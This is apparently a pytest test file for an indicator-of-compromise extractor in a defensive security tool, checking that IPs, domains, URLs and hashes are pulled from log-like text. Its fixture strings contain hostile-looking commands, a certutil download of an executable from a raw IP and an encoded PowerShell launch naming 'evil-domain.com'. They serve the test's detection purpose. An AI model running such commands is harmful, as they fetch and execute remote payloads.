from blueforge.enrichment.ioc import extract_iocs


def test_extracts_public_ip_domain_url():
    text = "certutil -urlcache -f http://45.77.12.9/a.exe evil-domain.com"
    iocs = extract_iocs(text)
    assert "45.77.12.9" in iocs["public_ipv4"]
    assert "evil-domain.com" in iocs["domain"]
    assert any("45.77.12.9" in u for u in iocs["url"])


def test_private_ip_not_flagged_public():
    iocs = extract_iocs("connection from 192.168.1.50 to 10.0.0.5")
    assert "192.168.1.50" in iocs["ipv4"]
    assert iocs["public_ipv4"] == []


def test_hashes():
    md5 = "d41d8cd98f00b204e9800998ecf8427e"
    iocs = extract_iocs(f"hash was {md5}")
    assert md5 in iocs["md5"]


def test_file_extension_is_not_a_domain():
    # "powershell.exe" must not be reported as a domain (a common false positive).
    iocs = extract_iocs("powershell.exe -enc AAAA connecting to evil-domain.com")
    assert "powershell.exe" not in iocs["domain"]
    assert "evil-domain.com" in iocs["domain"]


def test_empty_text_is_safe():
    assert extract_iocs("")["ipv4"] == []
